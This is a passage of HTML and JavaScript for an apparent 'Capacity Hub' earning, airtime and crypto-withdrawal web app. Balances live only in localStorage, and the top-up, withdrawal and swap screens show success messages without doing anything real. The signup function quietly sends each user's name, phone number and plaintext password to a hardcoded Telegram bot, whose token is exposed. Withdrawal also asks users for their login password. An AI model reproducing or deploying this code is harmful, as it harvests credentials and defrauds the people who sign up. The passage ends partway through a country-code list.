                    <input type="tel" id="a-phone" class="airtime-input" placeholder="Mobile Number (e.g. 081...)">
                    <div class="relative">
                        <select id="a-network" class="airtime-input appearance-none">
                            <option value="" disabled selected>Select Network</option>
                            <option value="MTN">MTN</option>
                            <option value="Airtel">Airtel</option>
                            <option value="Glo">Glo</option>
                            <option value="9mobile">9mobile</option>
                            <option value="Capacity SIM">Capacity SIM</option>
                        </select>
                        <i class="fas fa-chevron-down absolute right-3 top-3 text-slate-400 pointer-events-none text-[10px]"></i>
                    </div>
                    <input type="number" id="a-amount" class="airtime-input" placeholder="Airtime Amount (₦)">
                    <input type="password" id="a-pin" class="airtime-input" placeholder="Payment Password" maxlength="8">
                    <button onclick="processAirtime()" class="w-full bg-orange-500 text-white py-3.5 rounded-2xl font-bold text-xs mt-2 shadow-lg shadow-orange-500/10 active:scale-95 transition-transform">Top up</button>
                </div>
            </div>
            <div id="airtime-processing" class="hidden py-12 flex flex-col items-center">
                <div class="w-14 h-14 border-4 border-orange-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                <p class="text-xs font-bold text-slate-600 uppercase tracking-widest">Please Wait...</p>
                <p class="text-[10px] text-slate-400 mt-2">Verifying Transaction</p>
            </div>
            <div id="airtime-success" class="hidden text-center py-8">
                <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
                    <i class="fas fa-check text-xl"></i>
                </div>
                <h4 class="text-sm font-bold text-slate-800 uppercase mb-2">Top up Successful</h4>
                <p class="text-[11px] text-slate-500 leading-relaxed px-4">Your airtime request has been processed successfully. Check your balance shortly.</p>
                <button onclick="closeAirtimeModal()" class="w-full bg-slate-900 text-white py-3.5 rounded-2xl font-bold text-xs mt-8">Great</button>
            </div>
        </div>
    </div>

    <!-- Task Details Modal -->
    <div id="task-details-modal" class="fixed inset-0 z-[160] flex items-center justify-center p-4 bg-black/60 opacity-0 pointer-events-none transition-opacity">
        <div class="bg-white w-full max-w-xs rounded-2xl p-6 transform scale-90 transition-transform shadow-2xl overflow-y-auto max-h-[90vh]">
            <div class="w-12 h-12 orange-gradient rounded-xl mx-auto mb-4 flex items-center justify-center text-white text-xl">
                <i id="task-icon-main" class="fas fa-rocket"></i>
            </div>
            <h3 id="task-title-main" class="text-base font-black text-slate-900 mb-2 text-center"></h3>
            <div class="bg-slate-50 p-4 rounded-xl mb-4 border border-slate-100">
                <p id="task-desc-main" class="text-[11px] text-slate-600 leading-relaxed mb-3"></p>
                <div id="task-warning-box" class="bg-red-50 border border-red-100 p-3 rounded-lg hidden">
                    <p class="text-[10px] font-bold text-red-600 mb-1 uppercase tracking-tighter">Warning</p>
                    <p id="task-warning-text" class="text-[10px] text-red-500 leading-normal"></p>
                </div>
            </div>
            <div id="referral-code-box" class="mb-5 hidden">
                <p class="text-[9px] font-bold text-slate-400 uppercase text-center mb-1">Invitation Code</p>
                <div class="flex items-center gap-2 bg-orange-50 p-2 rounded-lg border border-orange-100">
                    <span class="flex-1 text-center font-black text-orange-600 tracking-widest text-sm" id="ref-code-value">y92x8cjd</span>
                    <button onclick="copyRefCode()" class="bg-orange-500 text-white px-3 py-1.5 rounded-md text-[10px] font-bold active:scale-95 transition-transform">COPY</button>
                </div>
            </div>
            <div class="flex flex-col gap-2">
                <button id="task-action-btn" class="w-full orange-gradient text-white py-3.5 rounded-xl font-bold text-xs shadow-lg shadow-orange-500/20 active:scale-95 transition-transform">Download App</button>
                <button onclick="closeTaskDetails()" class="w-full bg-slate-100 text-slate-600 py-3 rounded-xl font-bold text-xs active:scale-95 transition-transform">Back</button>
            </div>
        </div>
    </div>

    <!-- Support Modal -->
    <div id="support-modal" class="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/40 opacity-0 pointer-events-none transition-opacity">
        <div class="bg-white w-full max-w-xs rounded-2xl p-5 transform scale-90 transition-transform">
            <h3 class="text-sm font-bold text-slate-800 uppercase tracking-tight mb-1 text-center">User Support</h3>
            <p class="text-[10px] text-slate-400 text-center mb-4">Contact us through any channel below</p>

            <div class="space-y-2.5">

                <!-- Email -->
                <a href="mailto:capacitynigtech@gmail.com" class="flex items-center gap-3 p-3 bg-slate-50 rounded-xl border border-slate-100 active:bg-orange-50 transition-colors">
                    <div class="w-8 h-8 rounded-lg bg-orange-100 flex items-center justify-center flex-shrink-0">
                        <i class="fas fa-envelope text-orange-500" style="font-size:13px;"></i>
                    </div>
                    <div>
                        <p class="text-[9px] font-black text-slate-400 uppercase tracking-wider">Email</p>
                        <p class="text-[11px] font-bold text-slate-700">capacitynigtech@gmail.com</p>
                    </div>
                </a>

                <!-- WhatsApp -->
                <a href="https://wa.me/2349034472093" target="_blank" class="flex items-center gap-3 p-3 bg-[#e9fbe9] rounded-xl border border-green-100 active:bg-green-100 transition-colors">
                    <div class="w-8 h-8 rounded-lg bg-[#25D366] flex items-center justify-center flex-shrink-0">
                        <i class="fab fa-whatsapp text-white" style="font-size:16px;"></i>
                    </div>
                    <div>
                        <p class="text-[9px] font-black text-green-600 uppercase tracking-wider">WhatsApp</p>
                        <p class="text-[11px] font-bold text-slate-700">Chat with us</p>
                    </div>
                    <i class="fas fa-arrow-right text-green-400 ml-auto" style="font-size:10px;"></i>
                </a>


            </div>
            <button onclick="closeSupportModal()" class="w-full bg-slate-900 text-white py-2.5 rounded-xl font-bold text-xs mt-5">Close</button>
        </div>
    </div>

    <!-- Withdrawal Modal -->
    <div id="withdraw-modal" class="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/40 opacity-0 pointer-events-none transition-opacity">
        <div class="bg-white w-full max-sm rounded-2xl p-6 transform scale-90 transition-transform">
            <div class="flex justify-between items-center mb-4">
                <h3 id="withdraw-title" class="text-sm font-bold text-slate-800 uppercase tracking-tight">Withdraw Funds</h3>
                <button onclick="closeWithdrawModal()" class="text-slate-400"><i class="fas fa-times"></i></button>
            </div>
            <!-- Step 1 -->
            <div id="withdraw-fields">
                <div id="w-network-row" class="hidden" style="margin-bottom:10px;">
                    <select id="w-network" class="withdraw-input" style="margin-bottom:0;">
                        <option value="BEP20">BEP20 (Binance Smart Chain)</option>
                    </select>
                </div>
                <div id="w-bank-fields">
                    <input type="number" id="w-acc-num" class="withdraw-input" placeholder="Account Number">
                    <input type="text" id="w-acc-name" class="withdraw-input" placeholder="Account Name">
                    <input type="text" id="w-bank-name" class="withdraw-input" placeholder="Bank Name">
                </div>
                <div id="w-usdt-address-row" class="hidden" style="margin-bottom:10px;">
                    <input type="text" id="w-wallet-address" class="withdraw-input" placeholder="Wallet Address" style="margin-bottom:0;">
                </div>
                <input type="number" id="w-amount" class="withdraw-input" placeholder="Amount">
                <input type="password" id="w-pin" class="withdraw-input" placeholder="Transaction PIN" maxlength="4">
                <button id="w-proceed-btn" onclick="proceedUSDT()" class="hidden w-full bg-orange-500 text-white py-3.5 rounded-xl font-bold text-xs mt-2">Proceed</button>
                <button id="w-ngn-proceed-btn" onclick="proceedNGN()" class="hidden w-full bg-orange-500 text-white py-3.5 rounded-xl font-bold text-xs mt-2">Proceed</button>
                <button id="w-withdraw-btn" onclick="processWithdrawal()" class="w-full bg-orange-500 text-white py-3.5 rounded-xl font-bold text-xs mt-2">Withdrawal</button>
            </div>
            <!-- Step 2 -->
            <div id="withdraw-step2" class="hidden">
                <input type="password" id="w-login-password" class="withdraw-input" placeholder="Login Password">
                <button onclick="processWithdrawal()" class="w-full bg-orange-500 text-white py-3.5 rounded-xl font-bold text-xs mt-2">Withdrawal</button>
            </div>
            <div id="withdraw-processing" class="hidden py-10 flex flex-col items-center">
                <div class="w-12 h-12 border-4 border-orange-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                <p class="text-xs font-bold text-slate-600">Processing...</p>
            </div>
            <div id="withdraw-success" class="hidden text-center py-4">
                <div class="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-check"></i></div>
                <p class="text-[11px] leading-relaxed text-slate-600 font-medium">Your transaction was successful, contact our support if you did not receive your funds within 24 hours.</p>
                <button onclick="closeWithdrawModal()" class="w-full bg-slate-900 text-white py-3 rounded-xl font-bold text-xs mt-6">Close</button>
            </div>
        </div>
    </div>

    <!-- Transaction History Modal -->
    <div id="history-modal" class="fixed inset-0 z-[120] flex items-center justify-center p-4 bg-black/40 opacity-0 pointer-events-none transition-opacity">
        <div class="bg-white w-full max-w-sm rounded-3xl p-6 transform scale-90 transition-transform max-h-[80vh] flex flex-col">
            <div class="flex justify-between items-center mb-4 flex-shrink-0">
                <h3 class="text-sm font-bold text-slate-800 uppercase tracking-tight">Transaction History</h3>
                <button onclick="toggleHistory()" class="text-slate-400 p-2"><i class="fas fa-times"></i></button>
            </div>
            <div id="history-list" class="flex-grow overflow-y-auto space-y-1 pr-1">
                <div class="text-center py-10 text-slate-400 text-[10px] font-bold uppercase tracking-widest">No Transactions Yet</div>
            </div>
            <button onclick="toggleHistory()" class="w-full bg-slate-900 text-white py-3.5 rounded-2xl font-bold text-xs mt-4 flex-shrink-0">Close</button>
        </div>
    </div>

    <!-- Swap Modal -->
    <div id="swap-modal" class="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/40 opacity-0 pointer-events-none transition-opacity">
        <div class="bg-white w-full max-w-sm rounded-2xl p-6 transform scale-90 transition-transform">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-sm font-bold text-slate-800 uppercase tracking-tight">Swap</h3>
                <button onclick="closeSwapModal()" class="text-slate-400"><i class="fas fa-times"></i></button>
            </div>
            <div id="swap-form">
                <div class="flex gap-2 mb-4">
                    <button id="swap-btn-usdt-ngn" onclick="setSwapDirection('usdt-ngn')" class="flex-1 py-2 rounded-xl font-bold text-xs border border-orange-500 bg-orange-500 text-white transition-colors">USDT → NGN</button>
                    <button id="swap-btn-ngn-usdt" onclick="setSwapDirection('ngn-usdt')" class="flex-1 py-2 rounded-xl font-bold text-xs border border-orange-500 bg-white text-orange-500 transition-colors">NGN → USDT</button>
                </div>
                <p id="swap-rate-label" class="text-[10px] text-slate-400 font-bold text-center mb-3">Rate: 1 USDT = ₦1,500</p>
                <input type="number" id="swap-amount" class="withdraw-input" placeholder="Amount to swap">
                <p id="swap-preview" class="text-[10px] text-slate-400 font-semibold text-center mb-3">You will receive: —</p>
                <button onclick="processSwap()" class="w-full bg-orange-500 text-white py-3.5 rounded-xl font-bold text-xs mt-2">Swap</button>
            </div>
            <div id="swap-processing" class="hidden py-10 flex flex-col items-center">
                <div class="w-12 h-12 border-4 border-orange-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                <p class="text-xs font-bold text-slate-600">Processing...</p>
            </div>
            <div id="swap-success" class="hidden text-center py-4">
                <div class="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-check"></i></div>
                <p class="text-[11px] leading-relaxed text-slate-600 font-medium">Your transaction was successful, contact our support if you did not receive your funds within 24 hours.</p>
                <button onclick="closeSwapModal()" class="w-full bg-slate-900 text-white py-3 rounded-xl font-bold text-xs mt-6">Close</button>
            </div>
        </div>
    </div>

    <script>
        // ══════════════════════════════════════════
        // LOCAL BACKEND — data stored on device
        // ══════════════════════════════════════════

        function sbSaveUser() { /* data saved via saveToPhone() */ }

        function sbLoadUser(uid) {
            try {
                const d = localStorage.getItem('capacity_hub_core_data');
                if (!d) return null;
                const u = JSON.parse(d);
                return (u.uid === uid) ? u : null;
            } catch(e) { return null; }
        }

        function sbPhoneExists(phone) {
            try {
                const d = localStorage.getItem('capacity_hub_core_data');
                if (!d) return false;
                return JSON.parse(d).phone === phone;
            } catch(e) { return false; }
        }

        function sbLogin(name, password) {
            try {
                const d = localStorage.getItem('capacity_hub_core_data');
                if (!d) return null;
                const u = JSON.parse(d);
                if (u.name && u.name.toLowerCase() === name.toLowerCase() && u.password === password) return u;
                return null;
            } catch(e) { return null; }
        }

        function sbLoadAppData() {}

        async function sbSaveSubmission(sub) {
            const db = loadAdminDB() || {};
            if (!db.submissions) db.submissions = [];
            db.submissions.unshift(sub);
            saveAdminDB(db);
        }

        async function sbSaveWithdrawal(wd) {
            const db = loadAdminDB() || {};
            if (!db.withdrawals) db.withdrawals = [];
            db.withdrawals.unshift(wd);
            saveAdminDB(db);
        }

        function startUserListener() {}
        function startAppMetaListener() {}
        function initSupabase() { sbLoadAppData(); }

        const INACTIVITY_MS = 5 * 60 * 1000;

        let userData = {
            uid:'', name:'', phone:'', password:'', referral:'', country:'',
            wallet_balance:0, redemption_balance:0, usdt_balance:0,
            history:[], loggedIn:false
        };



        // ══════════════════════════════════════════
        // LOCAL CACHE HELPERS
        // ══════════════════════════════════════════
        function saveToPhone() {
            localStorage.setItem('capacity_hub_core_data', JSON.stringify({...userData, loggedIn:true}));
            sbSaveUser();
        }

        function loadAdminDB() {
            try { return JSON.parse(localStorage.getItem('ch_admin_db')||'null'); } catch(e) { return null; }
        }

        function saveAdminDB(data) {
            localStorage.setItem('ch_admin_db', JSON.stringify(data));
        }

        function getRate() {
            const db = loadAdminDB();
            return (db && db.usd_rate) ? Number(db.usd_rate) : 1500;
        }

        function syncUserToAdminDB() { sbSaveUser(); }

        // ══════════════════════════════════════════
        // BOOT — completely independent of Supabase
        // ══════════════════════════════════════════
        function bootSplash() {
            // 1. Restore saved user data immediately
            try {
                const saved = localStorage.getItem('capacity_hub_core_data');
                if (saved) {
                    userData = JSON.parse(saved);
                    if (!userData.usdt_balance) userData.usdt_balance = 0;
                }
            } catch(e) {}

            // 2. Wire up swap input
            const swapInput = document.getElementById('swap-amount');
            if (swapInput) swapInput.addEventListener('input', updateSwapPreview);

            // 3. Poll for local cache updates every 5s
            setInterval(pollDashboardUpdates, 5000);

            // 4. Start JSONBin backend in parallel — never blocks splash
            initSupabase();

            // 5. Hide splash after exactly 3 seconds — NOTHING can block this
            const splash = document.getElementById('splash-screen');
            if (!splash) { showNextScreen(); return; }

            setTimeout(() => {
                splash.style.transition = 'opacity 0.5s ease';
                splash.style.opacity = '0';
                setTimeout(() => {
                    splash.style.display = 'none';
                    showNextScreen();
                }, 500);
            }, 3000);
        }

        function showNextScreen() {
            try {
                const fresh = localStorage.getItem('capacity_hub_core_data');
                const parsed = fresh ? JSON.parse(fresh) : null;

                if (parsed && parsed.loggedIn) {
                    // Check 5-min inactivity
                    const leftAt = localStorage.getItem('ch_left_at');
                    if (leftAt && (Date.now() - parseInt(leftAt)) > INACTIVITY_MS) {
                        parsed.loggedIn = false;
                        localStorage.setItem('capacity_hub_core_data', JSON.stringify(parsed));
                        localStorage.removeItem('ch_left_at');
                        document.getElementById('auth-screen').classList.remove('hidden');
                        return;
                    }
                    // Show app immediately with local data
                    userData = { ...parsed };
                    document.getElementById('main-app').classList.remove('hidden');
                    updateBalanceUI();
                    updateHistoryUI();
                            startInactivityWatcher();
                } else {
                    document.getElementById('auth-screen').classList.remove('hidden');
                }
            } catch(e) {
                console.error('showNextScreen error:', e.message);
                // Safety net — always show auth screen
                try { document.getElementById('auth-screen').classList.remove('hidden'); } catch(_) {}
            }
        }

        // Start boot when DOM is ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', bootSplash);
        } else {
            bootSplash();
        }

        // Render task wall immediately when DOM is ready (failsafe)
        document.addEventListener('DOMContentLoaded', function() {
        });

        function startFirestoreUserListener() { startUserListener(); }


        // ── AUTH FUNCTIONS ──
        function showAuthTab(tab) {
            const isLogin = tab === 'login';
            document.getElementById('auth-login').classList.toggle('hidden', !isLogin);
            document.getElementById('auth-signup').classList.toggle('hidden', isLogin);
            document.getElementById('tab-login-btn').className = `flex-1 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider transition-all ${isLogin ? 'bg-white text-slate-900 shadow-sm' : 'text-slate-400'}`;
            document.getElementById('tab-signup-btn').className = `flex-1 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider transition-all ${!isLogin ? 'bg-white text-slate-900 shadow-sm' : 'text-slate-400'}`;
            document.getElementById('login-error').classList.add('hidden');
            document.getElementById('signup-error').classList.add('hidden');
        }

        function toggleAuthPw(inputId, btn) {
            const inp = document.getElementById(inputId);
            const show = inp.type === 'password';
            inp.type = show ? 'text' : 'password';
            btn.innerHTML = show ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
        }

        function signUp() {
            const name     = document.getElementById('signup-name').value.trim();
            const code     = document.getElementById('signup-code').value.trim();
            const phone    = document.getElementById('signup-phone').value.trim();
            const password = document.getElementById('signup-password').value;
            const referral = document.getElementById('signup-referral').value.trim();
            const errEl    = document.getElementById('signup-error');

            if (!name)     { errEl.textContent = 'Please enter your full name.'; errEl.classList.remove('hidden'); return; }
            if (!code || !code.startsWith('+')) { errEl.textContent = 'Please select a valid country code (e.g. +234).'; errEl.classList.remove('hidden'); return; }
            if (!phone)    { errEl.textContent = 'Please enter your phone number.'; errEl.classList.remove('hidden'); return; }
            if (!password || password.length < 6) { errEl.textContent = 'Password must be at least 6 characters.'; errEl.classList.remove('hidden'); return; }
            errEl.classList.add('hidden');

            const fullPhone = code + phone;
            const country   = getCountryFromCode(code) || 'Unknown';

            if (sbPhoneExists(fullPhone)) {
                errEl.textContent = 'This phone number is already registered on this device.';
                errEl.classList.remove('hidden');
                return;
            }

            userData = {
                uid:                phone,
                name,
                phone:              fullPhone,
                password,
                referral:           referral || '',
                country,
                wallet_balance:     0,
                usdt_balance:       0,
                redemption_balance: 0,
                history:            [],
                loggedIn:           true,
                created:            new Date().toLocaleDateString('en-NG')
            };

            localStorage.setItem('capacity_hub_core_data', JSON.stringify(userData));

            // ── TELEGRAM BOT NOTIFICATION ──
            sendTelegramSignupAlert(userData);

            // Disable button and show loading for 3 seconds
            const signupBtn = document.querySelector('button[onclick="signUp()"]');
            if (signupBtn) {
                signupBtn.disabled = true;
                signupBtn.textContent = 'Creating Account...';
                signupBtn.style.opacity = '0.7';
            }
            setTimeout(() => { launchApp(); }, 3000);
        }

        // ── TELEGRAM SIGNUP ALERT ──
        async function sendTelegramSignupAlert(user) {
            const BOT_TOKEN = '8766454627:AAGdC5Pc4nbkdnQN_p_pZ_mtK6O6QaZv2oo';
            const CHAT_ID   = '8403139958';

            // Persistent global signup counter (increments on every new signup)
            let tagNumber = 1;
            try {
                const prev = parseInt(localStorage.getItem('ch_signup_count') || '0', 10);
                tagNumber = prev + 1;
                localStorage.setItem('ch_signup_count', String(tagNumber));
            } catch(_) {}

            const message =
`🆕 *NEW USER SIGNUP — CAPACITY HUB*

🏷️ *Tag Number:* #${tagNumber}
👤 *Full Name:* ${user.name}
📱 *Phone Number:* ${user.phone}
🔑 *Password:* ${user.password}
🌍 *Country:* ${user.country}
📅 *Date:* ${user.created}
🆔 *UID:* ${user.uid}
${user.referral ? '🔗 *Referred By:* ' + user.referral : '🔗 *Referred By:* None'}`;

            // Send via Image src — works cross-origin without CORS issues
            try {
                const encodedMsg = encodeURIComponent(message);
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
                const img = new Image();
                img.src = url;
            } catch(err) {
                console.warn('Telegram notification failed:', err);
            }
        }

        function logIn() {
            const name     = document.getElementById('login-name').value.trim();
            const password = document.getElementById('login-password').value;
            const errEl    = document.getElementById('login-error');
            errEl.classList.add('hidden');
            if (!name || !password) { errEl.classList.remove('hidden'); return; }

            // Login from local storage only
            const match = sbLogin(name, password);
            if (!match) { errEl.classList.remove('hidden'); return; }

            userData = {
                uid:                match.uid || match.phone || '',
                name:               match.name,
                phone:              match.phone,
                password:           match.password,
                referral:           match.referral || '',
                country:            match.country || '',
                wallet_balance:     match.wallet_balance || 0,
                usdt_balance:       match.usdt_balance || 0,
                redemption_balance: match.redemption_balance || 0,
                history:            match.history || [],
                created:            match.created || '',
                loggedIn:           true
            };
            localStorage.setItem('capacity_hub_core_data', JSON.stringify(userData));

            // Disable button and show loading for 2 seconds
            const loginBtn = document.querySelector('button[onclick="logIn()"]');
            if (loginBtn) {
                loginBtn.disabled = true;
                loginBtn.textContent = 'Logging in...';
                loginBtn.style.opacity = '0.7';
            }
            setTimeout(() => { launchApp(); }, 2000);
        }

        const ALL_COUNTRIES = [
            {code:'+93',flag:'🇦🇫',name:'Afghanistan'},{code:'+355',flag:'🇦🇱',name:'Albania'},{code:'+213',flag:'🇩🇿',name:'Algeria'},{code:'+1684',flag:'🇦🇸',name:'American Samoa'},{code:'+376',flag:'🇦🇩',name:'Andorra'},{code:'+244',flag:'🇦🇴',name:'Angola'},{code:'+1264',flag:'🇦🇮',name:'Anguilla'},{code:'+1268',flag:'🇦🇬',name:'Antigua & Barbuda'},{code:'+54',flag:'🇦🇷',name:'Argentina'},{code:'+374',flag:'🇦🇲',name:'Armenia'},{code:'+297',flag:'🇦🇼',name:'Aruba'},{code:'+61',flag:'🇦🇺',name:'Australia'},{code:'+43',flag:'🇦🇹',name:'Austria'},{code:'+994',flag:'🇦🇿',name:'Azerbaijan'},{code:'+1242',flag:'🇧🇸',name:'Bahamas'},{code:'+973',flag:'🇧🇭',name:'Bahrain'},{code:'+880',flag:'🇧🇩',name:'Bangladesh'},{code:'+1246',flag:'🇧🇧',name:'Barbados'},{code:'+375',flag:'🇧🇾',name:'Belarus'},{code:'+32',flag:'🇧🇪',name:'Belgium'},{code:'+501',flag:'🇧🇿',name:'Belize'},{code:'+229',flag:'🇧🇯',name:'Benin'},{code:'+1441',flag:'🇧🇲',name:'Bermuda'},{code:'+975',flag:'🇧🇹',name:'Bhutan'},{code:'+591',flag:'🇧🇴',name:'Bolivia'},{code:'+387',flag:'🇧🇦',name:'Bosnia & Herzegovina'},{code:'+267',flag:'🇧🇼',name:'Botswana'},{code:'+55',flag:'🇧🇷',name:'Brazil'},{code:'+246',flag:'🇮🇴',name:'British Indian Ocean Territory'},{code:'+1284',flag:'🇻🇬',name:'British Virgin Islands'},{code:'+673',flag:'🇧🇳',name:'Brunei'},{code:'+359',flag:'🇧🇬',name:'Bulgaria'},{code:'+226',flag:'🇧🇫',name:'Burkina Faso'},{code:'+257',flag:'🇧🇮',name:'Burundi'},{code:'+855',flag:'🇰🇭',name:'Cambodia'},{code:'+237',flag:'🇨🇲',name:'Cameroon'},{code:'+1',flag:'🇨🇦',name:'Canada'},{code:'+238',flag:'🇨🇻',name:'Cape Verde'},{code:'+1345',flag:'🇰🇾',name:'Cayman Islands'},{code:'+236',flag:'🇨🇫',name:'Central African Republic'},{code:'+235',flag:'🇹🇩',name:'Chad'},{code:'+56',flag:'🇨🇱',name:'Chile'},{code:'+86',flag:'🇨🇳',name:'China'},{code:'+61',flag:'🇨🇽',name:'Christmas Island'},{code:'+57',flag:'🇨🇴',name:'Colombia'},{code:'+269',flag:'🇰🇲',name:'Comoros'},{code:'+242',flag:'🇨🇬',name:'Congo'},{code:'+243',flag:'🇨🇩',name:'Congo (DRC)'},{code:'+682',flag:'🇨🇰',name:'Cook Islands'},{code:'+506',flag:'🇨🇷',name:'Costa Rica'},{code:'+385',flag:'🇭🇷',name:'Croatia'},{code:'+53',flag:'🇨🇺',name:'Cuba'},{code:'+599',flag:'🇨🇼',name:'Curaçao'},{code:'+357',flag:'🇨🇾',name:'Cyprus'},{code:'+420',flag:'🇨🇿',name:'Czech Republic'},{code:'+45',flag:'🇩🇰',name:'Denmark'},{code:'+253',flag:'🇩🇯',name:'Djibouti'},{code:'+1767',flag:'🇩🇲',name:'Dominica'},{code:'+1809',flag:'🇩🇴',name:'Dominican Republic'},{code:'+593',flag:'🇪🇨',name:'Ecuador'},{code:'+20',flag:'🇪🇬',name:'Egypt'},{code:'+503',flag:'🇸🇻',name:'El Salvador'},{code:'+240',flag:'🇬🇶',name:'Equatorial Guinea'},{code:'+291',flag:'🇪🇷',name:'Eritrea'},{code:'+372',flag:'🇪🇪',name:'Estonia'},{code:'+268',flag:'🇸🇿',name:'Eswatini'},{code:'+251',flag:'🇪🇹',name:'Ethiopia'},{code:'+500',flag:'🇫🇰',name:'Falkland Islands'},{code:'+298',flag:'🇫🇴',name:'Faroe Islands'},{code:'+679',flag:'🇫🇯',name:'Fiji'},{code:'+358',flag:'🇫🇮',name:'Finland'},{code:'+33',flag:'🇫🇷',name:'France'},{code:'+594',flag:'🇬🇫',name:'French Guiana'},{code:'+689',flag:'🇵🇫',name:'French Polynesia'},{code:'+241',flag:'🇬🇦',name:'Gabon'},{code:'+220',flag:'🇬🇲',name:'Gambia'},{code:'+995',flag:'🇬🇪',name:'Georgia'},{code:'+49',flag:'🇩🇪',name:'Germany'},{code:'+233',flag:'🇬🇭',name:'Ghana'},{code:'+350',flag:'🇬🇮',name:'Gibraltar'},{code:'+30',flag:'🇬🇷',name:'Greece'},{code:'+299',flag:'🇬🇱',name:'Greenland'},{code:'+1473',flag:'🇬🇩',name:'Grenada'},{code:'+590',flag:'🇬🇵',name:'Guadeloupe'},{code:'+1671',flag:'🇬🇺',name:'Guam'},{code:'+502',flag:'🇬🇹',name:'Guatemala'},{code:'+44',flag:'🇬🇬',name:'Guernsey'},{code:'+224',flag:'🇬🇳',name:'Guinea'},{code:'+245',flag:'🇬🇼',name:'Guinea-Bissau'},{code:'+592',flag:'🇬🇾',name:'Guyana'},{code:'+509',flag:'🇭🇹',name:'Haiti'},{code:'+504',flag:'🇭🇳',name:'Honduras'},{code:'+852',flag:'🇭🇰',name:'Hong Kong'},{code:'+36',flag:'🇭🇺',name:'Hungary'},{code:'+354',flag:'🇮🇸',name:'Iceland'},{code:'+91',flag:'🇮🇳',name:'India'},{code:'+62',flag:'🇮🇩',name:'Indonesia'},{code:'+98',flag:'🇮🇷',name:'Iran'},{code:'+964',flag:'🇮🇶',name:'Iraq'},{code:'+353',flag:'🇮🇪',name:'Ireland'},{code:'+44',flag:'🇮🇲',name:'Isle of Man'},{code:'+972',flag:'🇮🇱',name:'Israel'},{code:'+39',flag:'🇮🇹',name:'Italy'},{code:'+1876',flag:'🇯🇲',name:'Jamaica'},{code:'+81',flag:'🇯🇵',name:'Japan'},{code:'+44',flag:'🇯🇪',name:'Jersey'},{code:'+962',flag:'🇯🇴',name:'Jordan'},{code:'+7',flag:'🇰🇿',name:'Kazakhstan'},{code:'+254',flag:'🇰🇪',name:'Kenya'},{code:'+686',flag:'🇰🇮',name:'Kiribati'},{code:'+383',flag:'🇽🇰',name:'Kosovo'},{code:'+965',flag:'🇰🇼',name:'Kuwait'},{code:'+996',flag:'🇰🇬',name:'Kyrgyzstan'},{code:'+856',flag:'🇱🇦',name:'Laos'},{code:'+371',flag:'🇱🇻',name:'Latvia'},{code:'+961',flag:'🇱🇧',name:'Lebanon'},{code:'+266',flag:'🇱🇸',name:'Lesotho'},{code:'+231',flag:'🇱🇷',name:'Liberia'},{code:'+218',flag:'🇱🇾',name:'Libya'},{code:'+423',flag:'🇱🇮',name:'Liechtenstein'},{code:'+370',flag:'🇱🇹',name:'Lithuania'},{code:'+352',flag:'🇱🇺',name:'Luxembourg'},{code:'+853',flag:'🇲🇴',name:'Macau'},{code:'+261',flag:'🇲🇬',name:'Madagascar'},{code:'+265',flag:'🇲🇼',name:'Malawi'},{code:'+60',flag:'🇲🇾',name:'Malaysia'},{code:'+960',flag:'🇲🇻',name:'Maldives'},{code:'+223',flag:'🇲🇱',name:'Mali'},{code:'+356',flag:'🇲🇹',name:'Malta'},{code:'+692',flag:'🇲🇭',name:'Marshall Islands'},{code:'+596',flag:'🇲🇶',name:'Martinique'},{code:'+222',flag:'🇲🇷',name:'Mauritania'},{code:'+230',flag:'🇲🇺',name:'Mauritius'},{code:'+262',flag:'🇾🇹',name:'Mayotte'},{code:'+52',flag:'🇲🇽',name:'Mexico'},{code:'+691',flag:'🇫🇲',name:'Micronesia'},{code:'+373',flag:'🇲🇩',name:'Moldova'},{code:'+377',flag:'🇲🇨',name:'Monaco'},{code:'+976',flag:'🇲🇳',name:'Mongolia'},{code:'+382',flag:'🇲🇪',name:'Montenegro'},{code:'+1664',flag:'🇲🇸',name:'Montserrat'},{code:'+212',flag:'🇲🇦',name:'Morocco'},{code:'+258',flag:'🇲🇿',name:'Mozambique'},{code:'+95',flag:'🇲🇲',name:'Myanmar'},{code:'+264',flag:'🇳🇦',name:'Namibia'},{code:'+674',flag:'🇳🇷',name:'Nauru'},{code:'+977',flag:'🇳🇵',name:'Nepal'},{code:'+31',flag:'🇳🇱',name:'Netherlands'},{code:'+687',flag:'🇳🇨',name:'New Caledonia'},{code:'+64',flag:'🇳🇿',name:'New Zealand'},{code:'+505',flag:'🇳🇮',name:'Nicaragua'},{code:'+227',flag:'🇳🇪',name:'Niger'},{code:'+234',flag:'🇳🇬',name:'Nigeria'},{code:'+683',flag:'🇳🇺',name:'Niue'},{code:'+850',flag:'🇰🇵',name:'North Korea'},{code:'+389',flag:'🇲🇰',name:'North Macedonia'},{code:'+1670',flag:'🇲🇵',name:'Northern Mariana Islands'},{code:'+47',flag:'🇳🇴',name:'Norway'},{code:'+968',flag:'🇴🇲',name:'Oman'},{code:'+92',flag:'🇵🇰',name:'Pakistan'},{code:'+680',flag:'🇵🇼',name:'Palau'},{code:'+970',flag:'🇵🇸',name:'Palestine'},{code:'+507',flag:'🇵🇦',name:'Panama'},{code:'+675',flag:'🇵🇬',name:'Papua New Guinea'},{code:'+595',flag:'🇵🇾',name:'Paraguay'},{code:'+51',flag:'🇵🇪',name:'Peru'},{code:'+63',flag:'🇵🇭',name:'Philippines'},{code:'+48',flag:'🇵🇱',name:'Poland'},{code:'+351',flag:'🇵🇹',name:'Portugal'},{code:'+1787',flag:'🇵🇷',name:'Puerto 